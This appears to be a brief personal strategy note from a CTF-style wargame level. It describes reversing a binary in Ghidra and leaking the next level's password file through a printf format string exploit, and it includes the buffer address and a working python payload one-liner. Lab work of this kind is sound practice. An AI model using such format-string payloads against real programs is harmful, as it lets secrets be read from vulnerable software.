/*	Strategy     */
/*********************/

=> use ghidra to reverser engineer baniray and create
=> create a patch on ghidra, modify .pass to level02/.pass
=> use the patch to determine address of buffer that read the pass file
found: 0x7fffffffe570

=> try to overwrite this address with format string exploit with the printf (line 98)
padding: 28 addr

=> trying to read value at pass file 
with injecting address and read it like "\x..addr... + %5$s"

=> doesn't work because printf don't print after \x00\x00 of the stack address
-> \x70\xe5\xff\xff\xff\x7f\x00\x00 <- doesn't print after the \x00\x00

python -c 'print "%00029$s" + "\x70\xe5\xff\xff\xff\x7f\x00\x00\nAAAA"' | ./level02
-> works on my patch in level02/.pass in tmp
-> but give partial token in level03/.pass ??? why lol
